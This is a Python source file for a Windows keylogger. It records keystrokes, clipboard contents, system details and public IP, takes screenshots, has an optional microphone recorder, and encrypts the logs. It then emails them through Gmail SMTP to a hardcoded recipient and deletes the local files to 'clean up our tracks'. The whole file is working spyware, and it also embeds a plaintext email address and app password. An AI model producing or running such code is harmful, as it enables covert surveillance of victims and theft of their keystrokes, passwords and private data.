# importing libraries

from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

import socket
import platform

import win32clipboard

from pynput.keyboard import Key, Listener

import time
import os

from scipy.io.wavfile import write
import sounddevice as sd

from cryptography.fernet import Fernet

import getpass
from requests import get

from multiprocessing import Process, freeze_support
from PIL import ImageGrab

keys_information = "key_log.txt"
system_information = "systeminfo.txt"
clipboard_information = "clipboard.txt"
audio_information = "audio.wav"
screenshot_information = "screenshot.png"

keys_information_e = "e_key_log.txt"
system_information_e = "e_system_info.txt"
clipboard_information_e = "e_clipboard_info.txt"

microphone_time = 10
time_iteration = 15
number_of_iterations_end = 3

email_address = "aryan.3walia@gmail.com"
password = "mekipzyxxmotamzx"

to_address = "aryanwaliablog@gmail.com"

key = "cCqy_Jc4rSnxoySgu7sMf75-jTZ12_HuvXB3wPCx8ws="

file_path = "C:\\Users\\ACER\\PycharmProjects\\Keylogger\\Project"
extend = "\\"
file_merge = file_path + extend

#email controls
def send_email(filename, attachment, to_add):
    from_address = email_address
    msg = MIMEMultipart()
    msg['From'] = from_address
    msg['To'] = to_add
    msg['subject'] = "Log File"
    body = "Body_of_the_mail"
    msg.attach(MIMEText(body, 'plain'))
    filename = filename
    attachment = open(attachment, 'rb')
    p = MIMEBase('application', 'octet-stream')
    p.set_payload(attachment.read())
    encoders.encode_base64(p)
    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
    msg.attach(p)
    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login(from_address, password)
    text = msg.as_string()
    s.sendmail(from_address, to_add, text)
    s.quit()


send_email(keys_information, file_path + extend + keys_information, to_address)

#get the computer information
def computer_information():
    with open(file_path + extend + system_information, "a") as f:
        hostname = socket.gethostname()
        ip_address = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip + '\n')
        except Exception:
            f.write("Couldn't get the public IP Address (most likely max query)")
        f.write("Processor: " + platform.processor() + '\n')
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + '\n')
        f.write("Hostname: " + hostname + '\n')
        f.write("Private IP Address: " + ip_address + '\n')


computer_information()

#get the clipboard contents
def copy_clipboard():
    with open(file_path + extend + clipboard_information, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            f.write("Clipboard Data: " + '\n' + pasted_data)
        except:
            f.write("Clipboard couldn't be copied")


copy_clipboard()

#get the microphone data
def microphone_data():
    fs = 44100
    seconds = microphone_time
    recording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
    sd.wait()
    write(file_path+extend+audio_information, fs, recording)

# microphone_data()

# get screenshots
def screenshot():
    im = ImageGrab.grab()
    im.save(file_path + extend + screenshot_information)

screenshot()

number_of_iterations = 0
current_time = time.time()
stopping_time = time.time() + time_iteration


# timer for keylogger
while number_of_iterations < number_of_iterations_end:

    count = 0
    keys = []


    def on_press(key):
        global keys, count, current_time
        print(key)
        keys.append(key)
        count += 1
        current_time = time.time()

        if count >= 1:
            count = 0
            write_file(keys)
            keys = []


    def write_file(keys):
        with open(file_path + extend + keys_information, "a") as f:
            for key in keys:
                k = str(key).replace("'", "")
                if k.find("space") > 0:
                    f.write('\n')
                    f.close()
                elif k.find("Key") == -1:
                    f.write(k)
                    f.close()


    def on_release(key):
        if key == Key.esc:
            return False
        if current_time > stopping_time:
            return False


    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

    if current_time > stopping_time:
        with open(file_path + extend + keys_information,  "w") as f:
            f.write(" ")
        screenshot()
        send_email(screenshot_information, file_path + extend + screenshot_information, to_address)
        copy_clipboard()
        number_of_iterations += 1
        current_time = time.time()
        stopping_time = time.time() + time_iteration

# encrypt files
files_to_encrypt = [file_merge + system_information,file_merge + clipboard_information, file_merge + keys_information]
encrypted_file_names = [file_merge + system_information_e, file_merge + clipboard_information_e, file_merge + keys_information_e]

count = 0

for encrypting_file in files_to_encrypt:
    with open(files_to_encrypt[count], 'rb') as f:
        data = f.read()
    fernet = Fernet(key)
    encrypted = fernet.encrypt(data)

    with open(encrypted_file_names[count] , 'wb') as f:
        f.write(encrypted)

    send_email(encrypted_file_names[count], encrypted_file_names[count], to_address)
    count += 1

time.sleep(120)

# clean up our tracks and delete files
delete_files = [system_information,clipboard_information,keys_information,screenshot_information,audio_information]
for file in delete_files:
    os.remove(file_merge + file)
